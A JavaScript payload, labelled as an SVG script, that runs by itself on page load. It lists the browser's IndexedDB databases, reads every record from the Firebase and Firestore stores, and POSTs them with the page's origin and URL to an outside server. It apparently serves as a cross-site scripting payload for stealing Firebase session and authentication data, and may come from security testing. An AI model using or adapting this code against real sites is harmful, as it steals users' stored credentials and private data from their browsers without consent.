svg.script:

console.clear();
console.log('═══════════════════════════════════════');
console.log('🔍 INDEXEDDB MONITOR');
console.log('═══════════════════════════════════════');

const statusLog = document.getElementById('statusLog');

function logStatus(message, isError = false) {
    const timestamp = new Date().toLocaleTimeString();
    const entry = `[${timestamp}] ${message}`;
    console.log(entry);
    if (statusLog) {
        statusLog.innerHTML += `<div style="color:${isError ? '#d32f2f' : '#333'}">${entry}</div>`;
        statusLog.scrollTop = statusLog.scrollHeight;
    }
}

async function exploreIndexedDB() {
    try {
        logStatus('📌 Checking IndexedDB...');

        // List all databases
        const databases = await indexedDB.databases();
        logStatus(`✅ Found ${databases.length} databases`);

        const dbNames = databases.map(db => db.name);
        logStatus(`📌 Database names: ${dbNames.join(', ')}`);

        // Look for Firebase databases
        const firebaseDBs = dbNames.filter(name => 
            name.includes('firebase') || 
            name.includes('heartbeat') ||
            name.includes('firestore')
        );

        if (firebaseDBs.length === 0) {
            logStatus('⚠️ No Firebase databases found');
            return null;
        }

        logStatus(`✅ Found Firebase databases: ${firebaseDBs.join(', ')}`);

        const allData = {};

        for (const dbName of firebaseDBs) {
            logStatus(`📌 Opening database: ${dbName}`);

            const db = await new Promise((resolve, reject) => {
                const request = indexedDB.open(dbName);
                request.onsuccess = () => resolve(request.result);
                request.onerror = () => reject(request.error);
            });

            logStatus(`✅ Opened ${dbName} with ${db.objectStoreNames.length} stores`);
            logStatus(`📌 Stores: ${Array.from(db.objectStoreNames).join(', ')}`);

            // Get data from each store
            const storeData = {};
            for (const storeName of db.objectStoreNames) {
                logStatus(`📌 Reading store: ${storeName}`);

                const data = await new Promise((resolve, reject) => {
                    const transaction = db.transaction(storeName, 'readonly');
                    const store = transaction.objectStore(storeName);
                    const request = store.getAll();
                    request.onsuccess = () => resolve(request.result);
                    request.onerror = () => reject(request.error);
                });

                storeData[storeName] = data;
                logStatus(`✅ Retrieved ${data.length} records from ${storeName}`);

                if (data.length > 0) {
                    logStatus(`📍 Sample: ${JSON.stringify(data[0]).substring(0, 200)}...`);
                }
            }

            allData[dbName] = storeData;
            db.close();
        }

        return allData;

    } catch (error) {
        logStatus(`❌ Error: ${error.message}`, true);
        console.error('Error details:', error);
        return null;
    }
}

async function sendToServer(data) {
    try {
        logStatus('📤 Sending data to server...');

        const response = await fetch('https://mytesting.redacted.com/api/indexeddb', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                source: window.location.origin,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                data: data
            })
        });

        if (response.ok) {
            const result = await response.json();
            logStatus(`✅ Data sent successfully! Response: ${JSON.stringify(result)}`);
        } else {
            logStatus(`❌ Server error: ${response.status} ${response.statusText}`, true);
        }
    } catch (error) {
        logStatus(`❌ Error sending to server: ${error.message}`, true);
    }
}

// Main execution
async function main() {
    logStatus('═══════════════════════════════════');
    logStatus('🚀 Starting IndexedDB exploration');
    logStatus(`📍 Origin: ${window.location.origin}`);

    const data = await exploreIndexedDB();

    if (data) {
        logStatus(`\n📊 Summary:`);
        const totalRecords = Object.values(data).reduce((sum, db) => {
            const storeRecords = Object.values(db).reduce((s, store) => s + store.length, 0);
            return sum + storeRecords;
        }, 0);
        logStatus(`  ✅ Total databases: ${Object.keys(data).length}`);
        logStatus(`  ✅ Total records: ${totalRecords}`);

        // Send to server
        await sendToServer(data);
    } else {
        logStatus('⚠️ No data to send');
    }

    logStatus('\n✅ Complete!');
    logStatus('═══════════════════════════════════');
}

// Run after page loads
window.addEventListener('load', function() {
    setTimeout(main, 1000);
});

// Also run now if already loaded
if (document.readyState === 'complete') {
    setTimeout(main, 500);
}
